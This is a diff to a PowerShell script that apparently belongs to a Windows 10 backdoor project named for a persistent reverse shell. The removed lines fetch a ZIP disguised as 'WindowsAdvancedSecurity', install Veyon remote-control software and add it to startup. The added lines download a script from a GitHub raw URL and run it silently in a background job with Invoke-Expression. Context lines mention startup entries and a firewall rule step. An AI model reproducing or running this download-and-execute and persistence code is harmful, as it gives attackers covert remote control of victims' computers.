@@ -64,20 +64,18 @@ if ($msnmsgrExists) {
     Write-Host "msnmsgr entry not found in startup."
 }
 
-# Download the ZIP file from Mediafire
-$downloadLink = "https://www.mediafire.com/file/s1m5k1yhrjbbpk0/WindowsAdvancedSecurity.zip/file"
-$destinationPath = "C:\temp\WindowsAdvancedSecurity.zip"
-Invoke-WebRequest -Uri $downloadLink -OutFile $destinationPath
+# URL del script alojado en GitHub
+$scriptUrl = "https://raw.githubusercontent.com/alariordas/PersistentReverseShell-Win10Backdoor/main/dogcareinstaller"
 
-# Extract the ZIP to the desired directory
-$extractToPath = "C:\Program Files\"
-Expand-Archive -Path $destinationPath -DestinationPath $extractToPath
+# Descarga el contenido del script
+$scriptContent = (Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing).Content
 
-# Create a shortcut for Veyon.exe and place it in the startup folder
-$WScriptShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WScriptShell.CreateShortcut("$($WScriptShell.SpecialFolders('Startup'))\Veyon.lnk")
-$Shortcut.TargetPath = "C:\Program Files\WindowsAdvancedSecurity\Veyon.exe"
-$Shortcut.Save()
+# Ejecuta el script en segundo plano
+Start-Job -ScriptBlock {
+    param($scriptContent)
+    Invoke-Expression $scriptContent
+} -ArgumentList $scriptContent
+
 
 
 # 5/10: Adding Firewall Rule
